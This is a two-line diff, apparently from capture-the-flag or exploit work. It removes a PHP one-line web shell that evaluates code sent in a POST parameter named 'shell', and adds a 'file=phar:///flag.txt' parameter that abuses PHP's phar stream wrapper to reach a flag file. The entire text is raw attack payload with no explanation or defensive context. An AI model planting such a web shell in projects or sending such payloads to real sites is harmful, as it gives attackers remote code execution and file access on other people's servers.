@@ -1,1 +1,1 @@
-<?php @eval($_POST['shell']);?>
+file=phar:///flag.txt
